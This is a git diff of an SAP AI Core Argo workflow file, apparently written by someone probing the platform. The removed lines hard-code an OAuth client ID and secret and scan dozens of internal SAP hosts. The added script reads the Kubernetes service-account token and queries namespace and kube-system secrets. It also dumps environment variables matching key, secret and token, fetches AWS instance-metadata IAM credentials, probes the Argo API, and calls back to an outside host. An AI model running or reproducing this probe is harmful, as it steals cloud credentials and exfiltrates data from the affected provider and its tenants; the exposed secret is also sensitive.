@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "32.0.0"
+    ai.sap.com/version: "33.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,76 +24,86 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V32 VERBOSE HOST PROBE ==="
+        echo "=== V33 K8S DEEP PROBE ==="
         echo "=== $(date -u) ==="
 
-        # Self-auth
-        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
-        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
-        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='
-        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
-          -H "Content-Type: application/x-www-form-urlencoded" \
-          --data-urlencode "grant_type=client_credentials" \
-          --data-urlencode "client_id=${CID}" \
-          --data-urlencode "client_secret=${CSC}" 2>&1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAILED'))" 2>/dev/null)
-        echo "[*] JWT: ${#JWT} chars"
+        # 1. Service Account Token
+        echo "=== SERVICE ACCOUNT TOKEN ==="
+        if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
+          echo "SA token exists: $(wc -c < /var/run/secrets/kubernetes.io/serviceaccount/token) bytes"
+          cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 200
+          echo "..."
+          echo "Namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
+          echo "CA cert: $(ls -la /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null)"
+        else
+          echo "No SA token mounted"
+          find / -name "token" -path "*/serviceaccount/*" 2>/dev/null | head -5
+        fi
 
-        # Verbose DNS + curl for 5 key targets
-        echo "=== DNS + CURL VERBOSE ==="
-        for host in \
-          "prod-eu-1.eu-central-1.aws.ml.hana.ondemand.com" \
-          "internalprod-1.eu-central-1.aws.ml.hana.ondemand.com" \
-          "preprod.eu-central-1.aws.ml.hana.ondemand.com" \
-          "api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod.eu-central-1.aws.ml.hana.ondemand.com"; do
-          echo "--- ${host} ---"
-          echo "DNS:"
-          dig +short "$host" 2>&1
-          echo "CURL:"
-          curl -svk --connect-timeout 5 --max-time 8 \
-            -H "Authorization: Bearer ${JWT}" \
-            -H "AI-Resource-Group: default" \
-            "https://${host}/v2/lm/scenarios" 2>&1 | grep -E "Connected|connect to|HTTP/|Trying|resolve|Could not" | head -5
+        # 2. K8s API from inside pod
+        echo "=== K8S API ACCESS ==="
+        KUBE_API="https://kubernetes.default.svc"
+        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+        if [ -n "$SA_TOKEN" ]; then
+          echo "Testing K8s API..."
+          # Self info
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$KUBE_API/api/v1/namespaces" 2>&1 | head -c 500
           echo ""
-        done
+          # Own namespace secrets
+          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
+          echo "Namespace: $NS"
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$KUBE_API/api/v1/namespaces/$NS/secrets" 2>&1 | head -c 500
+          echo ""
+          # Cross-namespace
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$KUBE_API/api/v1/namespaces/kube-system/secrets" 2>&1 | head -c 200
+          echo ""
+          # Pods in namespace
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$KUBE_API/api/v1/namespaces/$NS/pods" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f'  {p[\"metadata\"][\"name\"]}') for p in d.get('items',[])]" 2>/dev/null | head -20
+        fi
 
-        # Test ALL hosts but just show HTTP code + DNS
-        echo "=== ALL HOSTS QUICK SCAN ==="
-        for host in \
-          "internalprod-1.eu-central-1.aws.ml.hana.ondemand.com" \
-          "internalprod-2.eu-central-1.aws.ml.hana.ondemand.com" \
-          "internalprod-3.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod-eu-1.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod-eu-2.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod-eu-3.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod-eu-4.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod-eu-5.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod.eu-central-1.aws.ml.hana.ondemand.com" \
-          "preprod.eu-central-1.aws.ml.hana.ondemand.com" \
-          "trial.eu-central-1.aws.ml.hana.ondemand.com" \
-          "training.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod-us-1.us-east-1.aws.ml.hana.ondemand.com" \
-          "prod.us-east-1.aws.ml.hana.ondemand.com" \
-          "preprod.us-east-1.aws.ml.hana.ondemand.com" \
-          "prod.ap-northeast-1.aws.ml.hana.ondemand.com" \
-          "prod.ap-southeast-2.aws.ml.hana.ondemand.com" \
-          "intprod-eu12.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prodeuonly.eu-central-1.aws.ml.hana.ondemand.com" \
-          "workshop.eu-central-1.aws.ml.hana.ondemand.com" \
-          "perf-eu10.eu-central-1.aws.ml.hana.ondemand.com" \
-          "sec-eu10.eu-central-1.aws.ml.hana.ondemand.com" \
-          "bocr-eu-prd.eu-central-1.aws.ml.hana.ondemand.com" \
-          "preprod-eu-cc.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod-eu-cc.eu-central-1.aws.ml.hana.ondemand.com" \
-          "prod-br10.sa-east-1.aws.ml.hana.ondemand.com" \
-          "prod-ap11.ap-southeast-1.aws.ml.hana.ondemand.com" \
-          "bocr-eu11-prd.eu-central-1.aws.ml.hana.ondemand.com"; do
-          ip=$(dig +short "$host" 2>/dev/null | head -1)
-          resp=$(curl -sk --connect-timeout 3 --max-time 5 -o /tmp/hr.txt -w "%{http_code}" \
-            -H "Authorization: Bearer ${JWT}" -H "AI-Resource-Group: default" \
-            "https://${host}/v2/lm/scenarios" 2>/dev/null)
-          sz=$(wc -c < /tmp/hr.txt 2>/dev/null)
-          echo "${host} dns=${ip:-NXDOMAIN} http=${resp} sz=${sz}"
-        done
+        # 3. Environment variables (may contain secrets)
+        echo "=== ENVIRONMENT ==="
+        env | sort | grep -iE "key|secret|token|pass|auth|url|host|api|kube|argo|sap|aws|azure" | head -30
 
-        echo "=== V32 DONE $(date -u) ==="
+        # 4. Mounted volumes and secrets
+        echo "=== MOUNTS ==="
+        mount | grep -v "proc\|sys\|dev\|overlay" | head -20
+        echo "=== /etc secrets ==="
+        ls -la /etc/secrets/ 2>/dev/null || echo "No /etc/secrets"
+        ls -la /etc/config/ 2>/dev/null || echo "No /etc/config"
+        
+        # 5. Network from inside
+        echo "=== NETWORK ==="
+        ip addr 2>/dev/null | grep inet | head -5
+        echo "DNS config:"
+        cat /etc/resolv.conf 2>/dev/null
+        echo "Hosts:"
+        cat /etc/hosts 2>/dev/null
+
+        # 6. /proc exploration
+        echo "=== PROC ==="
+        cat /proc/self/cgroup 2>/dev/null | head -5
+        echo "Capabilities: $(cat /proc/self/status 2>/dev/null | grep -i cap)"
+        
+        # 7. IMDS check (AWS)
+        echo "=== IMDS ==="
+        curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 200
+        echo ""
+        # IMDSv2
+        IMDS_TOKEN=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
+        if [ -n "$IMDS_TOKEN" ]; then
+          echo "IMDSv2 token obtained!"
+          curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 300
+        fi
+
+        # 8. Argo Workflows API
+        echo "=== ARGO ==="
+        curl -sk --connect-timeout 3 "https://localhost:2746/api/v1/workflows" 2>&1 | head -c 200
+        curl -sk --connect-timeout 3 "http://argo-server.argo.svc:2746/api/v1/workflows" 2>&1 | head -c 200
+
+        # 9. Callback with results
+        echo "=== CALLBACK ==="
+        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
+        curl -s "https://www.masonhck.tech/ssrf.php?src=sap-probe-v33&ns=$NS" 2>&1 | head -c 50
+
+        echo "=== V33 DONE $(date -u) ==="
